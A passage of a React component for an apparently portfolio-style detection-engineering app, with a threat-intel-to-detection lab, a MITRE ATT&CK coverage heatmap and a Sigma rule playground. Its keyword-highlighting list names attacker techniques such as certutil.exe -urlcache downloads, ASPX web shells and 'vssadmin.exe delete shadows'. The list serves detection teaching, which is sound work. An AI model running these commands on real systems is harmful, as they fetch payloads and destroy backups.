              <span className="text-[0.68rem] text-slate-500">4 events • CNAME/TXT Exfil</span>
            </button>

            {customCampaign && (
              <button 
                onClick={() => setActiveCampaignId('custom')}
                className={`w-full text-left px-3 py-2.5 rounded-lg transition-all flex flex-col gap-0.5 border ${activeCampaignId === 'custom' ? 'bg-indigo-950/20 border-indigo-500/30 text-slate-100 shadow-lg shadow-indigo-500/5' : 'border-transparent text-slate-400 hover:bg-slate-800/30'}`}
              >
                <span className="text-[0.85rem] font-semibold">🛡️ Custom Uploaded Logs</span>
                <span className="text-[0.68rem] text-slate-500">{customCampaign.logs.length} logs ingested</span>
              </button>
            )}

            <button 
              onClick={() => setModalOpen(true)}
              className="mt-4 w-full bg-slate-900 border border-slate-800 hover:border-indigo-500/50 hover:bg-indigo-500/10 text-slate-200 text-xs py-2 rounded-lg font-semibold flex items-center justify-center gap-1.5 transition-all"
            >
              📥 Upload Custom Logs
            </button>
          </div>
        )}

        <div className="mt-auto border-t border-slate-800/60 pt-4 text-center">
          <p className="text-[0.7rem] text-slate-500 font-medium">Designed for Cybersecurity Portfolios</p>
          <span className="text-[0.62rem] text-slate-600 block mt-1">v1.2.0 • ATT&CK Framework v14</span>
        </div>
      </aside>

      {/* Main Panel Content */}
      <section className="flex-1 p-6 md:p-10 overflow-y-auto flex flex-col gap-8 max-w-7xl">
        
        {/* Active Tab: THREAT INTEL TO DETECTION LAB */}
        {activeTab === 'intel_lab' && (() => {
          const advisory = THREAT_ADVISORIES.find(a => a.id === intelAdvisoryId) || THREAT_ADVISORIES[0];
          
          const handleRunYara = () => {
            const result = simulateYaraScan(advisory.id, intelPayloadYara);
            setIntelYaraResult({
              scanned: true,
              triggered: result.triggered,
              matchedStrings: result.matchedStrings,
              error: result.error
            });
          };

          const handleRunSIEM = () => {
            if (intelFormat === 'yara') return;
            const payload = intelFormat === 'kql' ? intelPayloadKql : intelPayloadSpl;
            const result = simulateSIEMQuery(advisory.id, intelFormat, payload);
            setIntelSIEMResult({
              executed: true,
              triggered: result.triggered,
              error: result.error
            });
          };

          return (
            <>
              <header className="border-b border-slate-800/60 pb-5">
                <h2 className="text-2xl font-bold tracking-tight text-white mb-1 flex items-center gap-2">
                  📝 Threat Intel to Detection Lab
                </h2>
                <p className="text-slate-400 text-sm max-w-4xl">
                  Analyze real threat intelligence reports and see how detection engineers translate threat behaviors into YARA, KQL, and SPL rules. Test and evaluate rules in real-time.
                </p>
              </header>

              <div className="grid grid-cols-1 xl:grid-cols-12 gap-8">
                
                {/* Left Column: Advisory, Detections, & Construction Guide (Span 6) */}
                <div className="xl:col-span-6 flex flex-col gap-6">
                  {/* Report Select & Threat Report Extract */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 backdrop-blur-xl flex flex-col gap-4">
                    <div>
                      <label htmlFor="intel-advisory-select" className="text-xs font-bold text-slate-400 uppercase tracking-wider block mb-2">
                        Select Threat Advisory Report
                      </label>
                      <select 
                        id="intel-advisory-select"
                        value={intelAdvisoryId}
                        onChange={(e) => setIntelAdvisoryId(e.target.value)}
                        className="w-full bg-[#05070c] border border-slate-800 text-slate-200 rounded-lg p-2.5 text-xs focus:outline-none focus:border-indigo-500 cursor-pointer"
                      >
                        {THREAT_ADVISORIES.map(a => (
                          <option key={a.id} value={a.id}>{a.title}</option>
                        ))}
                      </select>
                    </div>

                    <div className="border-t border-slate-800/60 pt-3">
                      <span className="text-[0.65rem] text-slate-500 uppercase tracking-wider font-semibold block mb-1">
                        Report Source: {advisory.source}
                      </span>
                      <div className="bg-black/20 border border-slate-800/40 p-4 rounded-xl text-xs text-slate-300 leading-relaxed font-sans select-text whitespace-pre-wrap">
                        {advisory.extract.split(/(certutil\.exe|ASPX web shells|Sec-WebShell-Token|-urlcache|registry run keys|vssadmin\.exe delete shadows|vssadmin\.exe)/g).map((word, idx) => {
                          const lower = word.toLowerCase();
                          const isKeyword = ["certutil.exe", "aspx web shells", "sec-webshell-token", "-urlcache", "registry run keys", "vssadmin.exe delete shadows", "vssadmin.exe"].includes(lower);
                          if (isKeyword) {
                            return <span key={idx} className="bg-indigo-500/10 text-indigo-300 border border-indigo-500/20 px-1.5 py-0.5 rounded font-mono font-semibold text-[0.72rem]">{word}</span>;
                          }
                          return word;
                        })}
                      </div>
                    </div>
                  </div>

                  {/* Step-by-Step Construction Guide */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 backdrop-blur-xl flex flex-col gap-4">
                    <h3 className="text-xs font-bold text-slate-300 uppercase tracking-wider border-b border-slate-800 pb-2 flex items-center gap-1.5">
                      <span>🛠️</span> How Detections are Engineered from Reports
                    </h3>

                    <div className="flex flex-col gap-3">
                      {advisory.logicBreakdown.map((item, idx) => (
                        <div key={idx} className="bg-[#05070c]/50 border border-slate-800/60 p-4 rounded-xl flex items-start gap-4">
                          <div className="w-6 h-6 rounded-full bg-indigo-500/10 border border-indigo-500/30 flex items-center justify-center text-xs font-mono font-bold text-indigo-300 shrink-0">
                            {idx + 1}
                          </div>
                          <div className="flex-1 text-xs">
                            <span className="font-bold text-slate-200 block text-[0.78rem] mb-1">{item.step}</span>
                            <div className="text-slate-400 mb-2 leading-relaxed">
                              <span className="text-slate-500 font-semibold uppercase text-[0.62rem] block">Intelligence Indicator</span>
                              {item.indicator}
                            </div>
                            <div className="text-indigo-300 font-mono text-[0.7rem] bg-black/20 p-2 rounded-lg border border-slate-800/50">
                              <span className="text-slate-500 font-semibold uppercase text-[0.62rem] block font-sans">Rule Translation</span>
                              {item.translation}
                            </div>
                          </div>
                        </div>
                      ))}
                    </div>
                  </div>

                  {/* Rule Code Tab Viewer */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 backdrop-blur-xl flex flex-col gap-4">
                    <div className="flex justify-between items-center border-b border-slate-800 pb-2">
                      <span className="text-xs font-bold text-slate-300 uppercase tracking-wider">Detection Logic Code</span>
                      <div className="flex bg-[#05070c] p-0.5 rounded border border-slate-800">
                        <button
                          onClick={() => setIntelFormat('yara')}
                          className={`px-3 py-1 rounded text-[0.68rem] font-bold transition-all ${intelFormat === 'yara' ? 'bg-indigo-600 text-white shadow' : 'text-slate-400 hover:text-slate-200'}`}
                        >
                          YARA (File/Mem)
                        </button>
                        <button
                          onClick={() => setIntelFormat('kql')}
                          className={`px-3 py-1 rounded text-[0.68rem] font-bold transition-all ${intelFormat === 'kql' ? 'bg-indigo-600 text-white shadow' : 'text-slate-400 hover:text-slate-200'}`}
                        >
                          KQL (Sentinel)
                        </button>
                        <button
                          onClick={() => setIntelFormat('spl')}
                          className={`px-3 py-1 rounded text-[0.68rem] font-bold transition-all ${intelFormat === 'spl' ? 'bg-indigo-600 text-white shadow' : 'text-slate-400 hover:text-slate-200'}`}
                        >
                          SPL (Splunk)
                        </button>
                      </div>
                    </div>

                    <pre className="bg-[#05070c] border border-slate-800/80 p-4 rounded-xl text-[0.72rem] font-mono text-cyan-400 overflow-x-auto whitespace-pre leading-relaxed select-all">
                      {intelFormat === 'yara' ? advisory.yaraCode : intelFormat === 'kql' ? advisory.kqlCode : advisory.splCode}
                    </pre>
                  </div>
                </div>

                {/* Right Column: Live Testing Simulators (Span 6) */}
                <div className="xl:col-span-6 flex flex-col gap-6">
                  
                  {/* Active Simulator Block */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 backdrop-blur-xl flex flex-col gap-4">
                    <div className="flex justify-between items-center border-b border-slate-800 pb-2">
                      <span className="text-xs font-bold text-slate-300 uppercase tracking-wider flex items-center gap-1.5">
                        <span>🧪</span> {intelFormat === 'yara' ? 'YARA Binary Scanner' : intelFormat === 'kql' ? 'Sentinel KQL Simulator' : 'Splunk SPL Searcher'}
                      </span>
                      <button
                        onClick={() => {
                          if (intelFormat === 'yara') setIntelPayloadYara(advisory.yaraPayload);
                          else if (intelFormat === 'kql') setIntelPayloadKql(advisory.kqlPayload);
                          else setIntelPayloadSpl(advisory.splPayload);
                          setIntelYaraResult({ scanned: false, triggered: false, matchedStrings: [], error: null });
                          setIntelSIEMResult({ executed: false, triggered: false, error: null });
                        }}
                        className="text-[0.66rem] text-indigo-400 hover:text-indigo-300 font-semibold cursor-pointer"
                      >
                        Reset Payload
                      </button>
                    </div>

                    {intelFormat === 'yara' ? (
                      <div className="flex flex-col gap-4">
                        <label htmlFor="intel-payload-yara" className="text-[0.68rem] text-slate-500 uppercase tracking-wider font-semibold block">
                          Inspect File Data (Hex or ASCII String representation)
                        </label>
                        <textarea
                          id="intel-payload-yara"
                          value={intelPayloadYara}
                          onChange={(e) => setIntelPayloadYara(e.target.value)}
                          className="w-full h-36 bg-[#05070c] border border-slate-800 rounded-xl p-3.5 text-cyan-400 font-mono text-[0.72rem] focus:outline-none focus:border-indigo-500 resize-none leading-relaxed"
                          placeholder="Enter hex stream or text..."
                        />
                        <button
                          onClick={handleRunYara}
                          className="w-full bg-gradient-to-r from-indigo-500 to-purple-600 hover:brightness-110 text-white font-bold text-xs py-3 rounded-lg transition-all shadow-lg shadow-indigo-500/20 cursor-pointer"
                        >
                          ⚡ Execute YARA Engine Scan
                        </button>
                      </div>
                    ) : (
                      <div className="flex flex-col gap-4">
                        <label htmlFor="intel-payload-siem" className="text-[0.68rem] text-slate-500 uppercase tracking-wider font-semibold block">
                          Simulated Telemetry Log Event (JSON)
                        </label>
                        <textarea
                          id="intel-payload-siem"
                          value={intelFormat === 'kql' ? intelPayloadKql : intelPayloadSpl}
                          onChange={(e) => {
                            if (intelFormat === 'kql') setIntelPayloadKql(e.target.value);
                            else setIntelPayloadSpl(e.target.value);
                          }}
                          className="w-full h-36 bg-[#05070c] border border-slate-800 rounded-xl p-3.5 text-cyan-400 font-mono text-[0.72rem] focus:outline-none focus:border-indigo-500 resize-none leading-relaxed"
                          placeholder="Enter log JSON..."
                        />
                        <button
                          onClick={handleRunSIEM}
                          className="w-full bg-gradient-to-r from-indigo-500 to-purple-600 hover:brightness-110 text-white font-bold text-xs py-3 rounded-lg transition-all shadow-lg shadow-indigo-500/20 cursor-pointer"
                        >
                          🔍 Run {intelFormat === 'kql' ? 'KQL Query' : 'Splunk Search'} Simulation
                        </button>
                      </div>
                    )}
                  </div>

                  {/* Simulator Outcome Display */}
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 backdrop-blur-xl flex flex-col gap-3">
                    <span className="text-xs font-bold text-slate-400 uppercase tracking-wider block">
                      Evaluation Outcome
                    </span>

                    {intelFormat === 'yara' ? (
                      !intelYaraResult.scanned ? (
                        <div className="bg-slate-900/40 border border-slate-800/80 p-4 rounded-xl text-center text-xs text-slate-500">
                          Awaiting YARA scan...
                        </div>
                      ) : intelYaraResult.error ? (
                        <div className="bg-rose-950/20 border border-rose-500/30 text-rose-400 p-4 rounded-xl text-xs font-mono">
                          ⚠️ Scanner Error: {intelYaraResult.error}
                        </div>
                      ) : intelYaraResult.triggered ? (
                        <div className="bg-emerald-950/20 border border-emerald-500/40 p-4 rounded-xl flex flex-col gap-2">
                          <div className="text-emerald-400 font-bold text-xs flex items-center gap-1.5">
                            <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-ping"></span>
                            ✅ YARA Hit: Threat Detected!
                          </div>
                          <p className="text-[0.7rem] text-slate-400 leading-normal">
                            The inspected file payload satisfies the condition requirements of the YARA rule.
                          </p>
                          <div className="mt-2 border-t border-emerald-500/20 pt-2 flex flex-col gap-1">
                            <span className="text-[0.65rem] text-emerald-300 font-bold uppercase">Matched Strings:</span>
                            <div className="flex flex-wrap gap-1.5 mt-1">
                              {intelYaraResult.matchedStrings.map((str, idx) => (
                                <span key={idx} className="bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-0.5 rounded font-mono text-[0.66rem]">
                                  {str}
                                </span>
                              ))}
                            </div>
                          </div>
                        </div>
                      ) : (
                        <div className="bg-slate-900/60 border border-slate-800/80 p-4 rounded-xl flex flex-col gap-2">
                          <div className="text-slate-400 font-bold text-xs flex items-center gap-1.5">
                            <span className="w-2.5 h-2.5 rounded-full bg-slate-500"></span>
                            ❌ YARA Clean: No Matches
                          </div>
                          <p className="text-[0.7rem] text-slate-500 leading-normal">
                            The inspected payload does not trigger the rule strings or condition thresholds.
                          </p>
                        </div>
                      )
                    ) : (
                      !intelSIEMResult.executed ? (
                        <div className="bg-slate-900/40 border border-slate-800/80 p-4 rounded-xl text-center text-xs text-slate-500">
                          Awaiting query execution...
                        </div>
                      ) : intelSIEMResult.error ? (
                        <div className="bg-rose-950/20 border border-rose-500/30 text-rose-400 p-4 rounded-xl text-xs font-mono">
                          ⚠️ Execution Error: {intelSIEMResult.error}
                        </div>
                      ) : intelSIEMResult.triggered ? (
                        <div className="bg-emerald-950/20 border border-emerald-500/40 p-4 rounded-xl flex flex-col gap-2">
                          <div className="text-emerald-400 font-bold text-xs flex items-center gap-1.5">
                            <span className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-ping"></span>
                            ✅ Query Alert Triggered!
                          </div>
                          <p className="text-[0.7rem] text-slate-400 leading-normal">
                            The log values matched the query logic filters. This event generates a high-fidelity SIEM alert.
                          </p>
                        </div>
                      ) : (
                        <div className="bg-slate-900/60 border border-slate-800/80 p-4 rounded-xl flex flex-col gap-2">
                          <div className="text-slate-400 font-bold text-xs flex items-center gap-1.5">
                            <span className="w-2.5 h-2.5 rounded-full bg-slate-500"></span>
                            ❌ Event Suppressed / Filtered
                          </div>
                          <p className="text-[0.7rem] text-slate-500 leading-normal">
                            The telemetry log values do not satisfy the filter conditions. Query returned empty.
                          </p>
                        </div>
                      )
                    )}
                  </div>

                  {/* Educational Information Card */}
                  <div className="bg-[#0f1322]/40 border border-slate-800/60 rounded-2xl p-5 text-xs text-slate-400 leading-relaxed">
                    <h4 className="font-bold text-slate-200 mb-2 flex items-center gap-1">
                      <span>💡</span> Efficacy: Detections vs. Query Searching
                    </h4>
                    <p className="mb-2">
                      In threat hunting, analysts write <strong>SIEM query searches</strong> to actively sift through massive log tables. These are transient and user-driven.
                    </p>
                    <p>
                      In contrast, a <strong>detection</strong> (like a YARA binary signature or a KQL alert rule) is a standardized, persistent logic block deployed to run continuously against telemetry streams, feeding the SOC alert pipeline.
                    </p>
                  </div>
                </div>

              </div>
            </>
          );
        })()}

        {/* Active Tab: COVERAGE SANDBOX */}
        {activeTab === 'sandbox' && (
          <>
            {/* Header info */}
            <header className="border-b border-slate-800/60 pb-5">
              <h2 className="text-2xl font-bold tracking-tight text-white mb-1">
                {campaign.name}
              </h2>
              <p className="text-slate-400 text-sm max-w-4xl">
                {campaign.description}
              </p>
            </header>

            {/* Metrics Counters Row */}
            <div className="grid grid-cols-2 lg:grid-cols-4 gap-4" aria-label="Campaign Metrics">
              <div className="bg-[#0f1322]/80 border border-slate-800/60 p-5 rounded-xl relative overflow-hidden">
                <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider block">Telemetry Events</span>
                <span className="text-3xl font-bold mt-1 block font-mono">{totalLogs}</span>
                <div className="absolute bottom-0 left-0 w-full h-[3px] bg-indigo-500"></div>
              </div>
              <div className="bg-[#0f1322]/80 border border-slate-800/60 p-5 rounded-xl relative overflow-hidden">
                <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider block">Alerted / Covered</span>
                <span className="text-3xl font-bold mt-1 block font-mono text-emerald-400">{coveredLogs}</span>
                <div className="absolute bottom-0 left-0 w-full h-[3px] bg-emerald-500"></div>
              </div>
              <div className="bg-[#0f1322]/80 border border-slate-800/60 p-5 rounded-xl relative overflow-hidden">
                <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider block">Telemetry Gaps</span>
                <span className="text-3xl font-bold mt-1 block font-mono text-amber-500">{gapLogs}</span>
                <div className="absolute bottom-0 left-0 w-full h-[3px] bg-amber-500"></div>
              </div>
              <div className="bg-[#0f1322]/80 border border-slate-800/60 p-5 rounded-xl relative overflow-hidden">
                <span className="text-xs font-semibold text-slate-400 uppercase tracking-wider block">Blind Spots</span>
                <span className="text-3xl font-bold mt-1 block font-mono text-rose-500">{blindspotLogs}</span>
                <div className="absolute bottom-0 left-0 w-full h-[3px] bg-rose-500"></div>
              </div>
            </div>

            {/* MITRE MATRIX HEATMAP */}
            <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6">
              <div className="flex flex-col sm:flex-row justify-between items-start sm:items-center gap-4 mb-5">
                <h3 className="text-lg font-bold text-white flex items-center gap-2">
                  🛡️ MITRE ATT&CK Coverage Heatmap
                </h3>
                <div className="flex flex-wrap gap-4 text-xs">
                  <div className="flex items-center gap-1.5 text-slate-400">
                    <div className="w-3 h-3 rounded bg-emerald-500/10 border border-emerald-500"></div>
                    <span>Fully Alerted</span>
                  </div>
                  <div className="flex items-center gap-1.5 text-slate-400">
                    <div className="w-3 h-3 rounded bg-amber-500/10 border border-amber-500"></div>
                    <span>Telemetry Gap</span>
                  </div>
                  <div className="flex items-center gap-1.5 text-slate-400">
                    <div className="w-3 h-3 rounded bg-rose-500/10 border border-rose-500"></div>
                    <span>Blind Spot</span>
                  </div>
                  <div className="flex items-center gap-1.5 text-slate-400">
                    <div className="w-3 h-3 rounded bg-slate-900 border border-slate-800"></div>
                    <span>Unmonitored</span>
                  </div>
                </div>
              </div>

              {/* Scrolls matrix horizontally */}
              <div className="overflow-x-auto pb-2">
                <div className="grid grid-cols-12 gap-2.5 min-w-[1900px]">
                  {MITRE_SCHEMA.map((tactic) => (
                    <div key={tactic.tacticId} className="flex flex-col gap-2.5">
                      <div className="bg-[#121829] border-b-2 border-indigo-500 p-3 rounded text-center min-h-[50px] flex flex-col justify-center shrink-0">
                        <span className="text-[0.78rem] font-bold text-white leading-tight">{tactic.tacticName}</span>
                        <span className="text-[0.62rem] text-slate-500 font-semibold">{tactic.tacticId}</span>
                      </div>

                      {tactic.techniques.map((tech) => {
                        const status = matrixCoverageMap[tech.id];
                        let statusClasses = "bg-slate-950/20 border-slate-800/80 text-slate-400";
                        if (status === 'full_coverage') {
                          statusClasses = "bg-emerald-950/15 border-emerald-500/60 text-emerald-100 shadow-sm shadow-emerald-500/5";
                        } else if (status === 'partial_coverage') {
                          statusClasses = "bg-amber-950/15 border-amber-500/60 text-amber-100 shadow-sm shadow-amber-500/5";
                        } else if (status === 'no_coverage') {
                          statusClasses = "bg-rose-950/15 border-rose-500/60 text-rose-100 shadow-sm shadow-rose-500/5";
                        }

                        const isHighlighted = highlightedTechId === tech.id;
                        const highlightBorder = isHighlighted ? "ring-2 ring-indigo-500 scale-[1.01]" : "";

                        return (
                          <div 
                            key={tech.id}
                            ref={el => { matrixCellRefs.current[`cell-${tech.id}`] = el; }}
                            onClick={() => handleMatrixCellClick(tech.id)}
                            className={`p-3 rounded-lg border text-left cursor-pointer transition-all duration-200 min-h-[82px] flex flex-col justify-between hover:bg-slate-800/30 hover:translate-y-[-1px] ${statusClasses} ${highlightBorder}`}
                          >
                            <span className={`text-[0.68rem] font-mono font-semibold ${status === 'full_coverage' ? 'text-emerald-400' : status === 'partial_coverage' ? 'text-amber-400' : status === 'no_coverage' ? 'text-rose-400' : 'text-slate-500'}`}>
                              {tech.id}
                            </span>
                            <span className="text-[0.76rem] font-medium leading-tight line-clamp-2 mt-1">
                              {tech.name}
                            </span>
                          </div>
                        );
                      })}
                    </div>
                  ))}
                </div>
              </div>
            </div>

            {/* TWO-COLUMN LOWER SECTION: LOG TIMELINE & REMEDIATION */}
            <div className="grid grid-cols-1 xl:grid-cols-12 gap-8">
              
              {/* Timeline (Left Column: Span 7) */}
              <div className="xl:col-span-7 bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 flex flex-col">
                <div className="flex justify-between items-center mb-5">
                  <h3 className="text-lg font-bold text-white flex items-center gap-2">
                    📜 Chronological Log Timeline
                  </h3>
                  <span className="text-[0.7rem] text-slate-500">Click a row to inspect JSON payload</span>
                </div>

                <div className="flex flex-col gap-3 max-h-[800px] overflow-y-auto pr-2">
                  {campaign.logs.map((log, index) => {
                    const status = log.coverage_details.status;
                    const statusColor = status === 'full_coverage' ? 'bg-emerald-500' : (status === 'partial_coverage' ? 'bg-amber-500' : 'bg-rose-500');
                    
                    const badgeText = status === 'full_coverage' ? 'Alerted / Covered' : (status === 'partial_coverage' ? 'Telemetry Gap' : 'Blind Spot');
                    const badgeClass = status === 'full_coverage' ? 'bg-emerald-500/10 text-emerald-400 border border-emerald-500/20' : (status === 'partial_coverage' ? 'bg-amber-500/10 text-amber-400 border border-amber-500/20' : 'bg-rose-500/10 text-rose-400 border border-rose-500/20');
                    
                    const techId = log.mitre_attack?.technique?.id;
                    const isExpanded = expandedLogIndexes.has(index);

                    const isFilterActive = highlightedTechId === techId;
                    const activeFilterStyle = isFilterActive ? "border-indigo-500 shadow-md shadow-indigo-500/5 ring-1 ring-indigo-500/30" : "border-slate-800/60";

                    return (
                      <div 
                        key={index}
                        ref={el => { timelineItemRefs.current[`log-${index}`] = el; }}
                        className={`border rounded-xl bg-[#131929]/40 overflow-hidden transition-all duration-200 ${activeFilterStyle}`}
                      >
                        {/* Summary Header */}
                        <div 
                          onClick={() => toggleLogExpand(index)}
                          className="p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3 cursor-pointer hover:bg-slate-800/20 select-none"
                        >
                          <div className="flex items-center gap-3 min-w-0">
                            <div className={`w-2.5 h-2.5 rounded-full shrink-0 ${statusColor}`}></div>
                            <div className="flex flex-col min-w-0">
                              <span className="text-[0.8rem] font-medium text-slate-100 truncate">
                                Host: {log.host?.name} | Action: {log.event?.action} | Proc: {log.process?.name || 'Network'}
                              </span>
                              <span className="text-[0.68rem] text-slate-500 font-mono mt-0.5">{log['@timestamp']}</span>
                            </div>
                          </div>

                          <div className="flex items-center gap-2 shrink-0 self-end sm:self-auto">
                            {techId && (
                              <button 
                                onClick={(e) => handleMitreBadgeClick(techId, e)}
                                className="bg-indigo-500/10 hover:bg-indigo-500 hover:text-white border border-indigo-500/20 text-indigo-300 text-[0.66rem] font-mono font-semibold px-2 py-0.5 rounded transition-all"
                              >
                                {techId}
                              </button>
                            )}
                            <span className={`text-[0.66rem] font-bold px-2 py-0.5 rounded ${badgeClass}`}>
                              {badgeText}
                            </span>
                            <span className={`text-slate-500 text-xs transition-transform duration-200 ${isExpanded ? 'rotate-180' : ''}`}>
                              ▼
                            </span>
                          </div>
                        </div>

                        {/* Collapsed Details View */}
                        {isExpanded && (
                          <div className="border-t border-slate-800/60 bg-black/30 p-4">
                            <pre 
                              className="text-[0.74rem] leading-relaxed font-mono overflow-x-auto whitespace-pre-wrap select-all"
                              dangerouslySetInnerHTML={{ __html: syntaxHighlight(JSON.stringify(log, null, 2)) }}
                            />
                          </div>
                        )}
                      </div>
                    );
                  })}
                </div>
              </div>

              {/* Remediation Panel (Right Column: Span 5) */}
              <div className="xl:col-span-5 bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-6 flex flex-col">
                <div className="flex justify-between items-center mb-5">
                  <h3 className="text-lg font-bold text-white flex items-center gap-2">
                    🛠️ Remediation & Gap Diagnostics
                  </h3>
                  <span className="text-[0.7rem] text-slate-500">Actionable detection fixes</span>
                </div>

                <div className="flex flex-col gap-4 max-h-[800px] overflow-y-auto pr-1">
                  {campaign.logs.filter(l => l.coverage_details.status !== 'full_coverage').map((log, index) => {
                    const details = log.coverage_details;
                    const isBlindspot = details.status === 'no_coverage';
                    const borderLeft = isBlindspot ? "border-l-4 border-l-rose-500" : "border-l-4 border-l-amber-500";
                    
                    return (
                      <div 
                        key={index}
                        className={`bg-[#131929]/40 border border-slate-800/60 rounded-xl p-4 flex flex-col gap-3 hover:border-slate-700/60 transition-all ${borderLeft}`}
                      >
                        <div className="flex justify-between items-start">
                          <h4 className="font-bold text-sm text-slate-200">
                            {details.summary || "Visibility Diagnostic"}
                          </h4>
                          <span className={`text-[0.6rem] font-bold uppercase tracking-wider px-2 py-0.5 rounded border ${isBlindspot ? 'bg-rose-500/10 text-rose-400 border-rose-500/20' : 'bg-amber-500/10 text-amber-400 border-amber-500/20'}`}>
                            {isBlindspot ? 'Blind Spot' : 'Telemetry Gap'}
                          </span>
                        </div>

                        <div className="text-xs text-slate-400 leading-normal">
                          <strong className="text-slate-300">Tactic:</strong> {log.mitre_attack?.tactic?.name} | <strong className="text-slate-300">Technique:</strong> <span className="text-indigo-400 font-mono">{log.mitre_attack?.technique?.id}</span>
                          <p className="mt-2 bg-slate-950/20 border border-slate-800/50 p-2.5 rounded-lg text-slate-300 text-[0.75rem]">
                            <strong>Issue:</strong> {details.gap_reason}
                          </p>
                        </div>

                        {details.remediation && (
                          <div className="border-t border-slate-800/60 pt-3 mt-1 flex flex-col gap-2">
                            <span className="text-[0.72rem] font-bold text-indigo-300 flex items-center gap-1.5">
                              🛡️ Fix: {details.remediation.title}
                            </span>
                            <ul className="list-disc list-inside text-[0.7rem] text-slate-400 flex flex-col gap-1 pl-1 leading-normal">
                              {details.remediation.steps.map((step, idx) => (
                                <li key={idx}>{step}</li>
                              ))}
                            </ul>
                            
                            {details.remediation.cmd && (
                              <div className="mt-2 flex flex-col gap-1.5">
                                <div className="flex justify-between items-center text-[0.62rem] text-slate-500 font-semibold uppercase tracking-wide">
                                  <span>Audit Config Script</span>
                                  <button 
                                    id={`copy-btn-${index}`}
                                    onClick={() => handleCopyCommand(details.remediation!.cmd!, `copy-btn-${index}`)}
                                    className="hover:text-white transition-colors cursor-pointer"
                                  >
                                    Copy Script
                                  </button>
                                </div>
                                <pre className="bg-[#05070c] border border-slate-800/80 p-2.5 rounded text-[0.72rem] font-mono text-cyan-400 overflow-x-auto whitespace-pre">
                                  {details.remediation.cmd}
                                </pre>
                              </div>
                            )}
                          </div>
                        )}
                      </div>
                    );
                  })}
                  
                  {campaign.logs.filter(l => l.coverage_details.status !== 'full_coverage').length === 0 && (
                    <div className="bg-emerald-950/10 border border-emerald-500/20 text-emerald-400 p-5 rounded-xl text-center text-xs">
                      🏆 <strong>Security Coverage Perfect!</strong> No telemetry gaps or blind spots identified in this campaign.
                    </div>
                  )}
                </div>
              </div>

            </div>
          </>
        )}

        {/* Active Tab: DaC Playground */}
        {activeTab === 'playground' && (() => {
          let parsedRule = null;
          let parseError: string | null = null;
          let splunkQuery = "";
          let kqlQuery = "";

          try {
            parsedRule = parseYamlRule(playgroundYaml);
            splunkQuery = compileToSplunk(parsedRule);
            kqlQuery = compileToKql(parsedRule);
          } catch (e: any) {
            parseError = e.message;
          }

          const handleEvaluatePlayground = () => {
            if (!parsedRule) {
              setPlaygroundEvaluationResult({ evaluated: true, triggered: false, error: "Rule is invalid or not parsed correctly." });
              return;
            }
            try {
              const record = JSON.parse(playgroundLog);
              const triggered = evaluateRuleAgainstRecord(parsedRule, record);
              setPlaygroundEvaluationResult({ evaluated: true, triggered, error: null });
            } catch (e: any) {
              setPlaygroundEvaluationResult({ evaluated: true, triggered: false, error: `Invalid log JSON: ${e.message}` });
            }
          };

          return (
            <>
              <header className="border-b border-slate-800/60 pb-5">
                <h2 className="text-2xl font-bold tracking-tight text-white mb-1 flex items-center gap-2">
                  💻 Detection-as-Code Playground
                </h2>
                <p className="text-slate-400 text-sm max-w-4xl">
                  Write, compile, and validate detection rules in real-time. Select a template or write your custom Sigma rule, inspect the compiled SPL and KQL queries, and test them instantly against simulation logs.
                </p>
              </header>

              <div className="grid grid-cols-1 xl:grid-cols-12 gap-8">
                {/* Column 1: Rule Editor (YAML) - Span 4 */}
                <div className="xl:col-span-4 flex flex-col gap-5">
                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 backdrop-blur-xl flex flex-col gap-4">
                    <div>
                      <label htmlFor="playground-template-select" className="text-xs font-bold text-slate-400 uppercase tracking-wider block mb-2">
                        Starter Template
                      </label>
                      <select 
                        id="playground-template-select"
                        value={playgroundTemplate}
                        onChange={(e) => setPlaygroundTemplate(e.target.value)}
                        className="w-full bg-[#05070c] border border-slate-800 text-slate-200 rounded-lg p-2.5 text-xs focus:outline-none focus:border-indigo-500 cursor-pointer"
                      >
                        <option value="process_creation">Process Creation (Sysmon Event ID 1)</option>
                        <option value="registry_mod">Registry Modification (Sysmon Event ID 13)</option>
                        <option value="dns_tunnel">DNS Query (DNS Log)</option>
                      </select>
                    </div>
                  </div>

                  <div className="bg-[#0d111c]/70 border border-slate-800/60 rounded-2xl p-5 flex-1 flex flex-col backdrop-blur-xl min-h-[400px]">
                    <div className="flex justify-between items-center mb-3">
                      <span className="text-xs font-bold text-slate-400 uppercase tracking-wider font-mono">Sigma YAML Editor</span>
                      {parseError ? (
                        <span className="text-[0.65rem] bg-rose-500/10 text-rose-400 border border-rose-500/20 px-2 py-0.5 rounded font-mono font-semibold">
                          Malformed YAML
                        </span>
                      ) : (
                        <span className="text-[0.65rem] bg-emerald-500/10 text-emerald-400 border border-emerald-500/20 px-2 py-0.5 rounded font-mono font-semibold">
                          YAML Valid
                        </span>
                      )}
                    </div>
                    
                    <textarea
                      value={playgroundYaml}
                      onChange={(e) => setPlaygroundYaml(e.target.value)}
                      className="flex-grow w-full bg-[#05070c] border border-slate-800 rounded-xl p-4 text-[0.72rem] font-mono text-indigo-300 focus:outline-none focus:border-indigo-500 resize-none h-[420px]"
                      placeholder="Type your Sigma YAML rule here..."
                    />
                    
                    {parseError && (
                      <div className="bg-rose-950/20 border border-rose-500/30 text-rose-400 p-3 rounded-lg text-[0.7rem] mt-3 font-mono leading-normal">
                        Error: {parseError}
                      </div>
                    )}

                    <button
                      onClick={handleRegisterRule}
                      disabled={!!parseError || !playgroundYaml.trim()}
